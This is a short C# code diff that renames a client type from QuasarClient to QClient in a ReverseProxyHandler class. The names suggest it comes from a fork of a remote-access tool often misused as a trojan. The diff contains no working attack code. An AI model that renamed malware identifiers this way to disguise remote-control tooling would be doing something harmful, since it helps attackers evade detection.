@@ -7,9 +7,9 @@ namespace Ton618.MessageHandlers
 {
     public class ReverseProxyHandler : IMessageProcessor
     {
-        private readonly QuasarClient _client;
+        private readonly QClient _client;
 
-        public ReverseProxyHandler(QuasarClient client)
+        public ReverseProxyHandler(QClient client)
         {
             _client = client;
         }
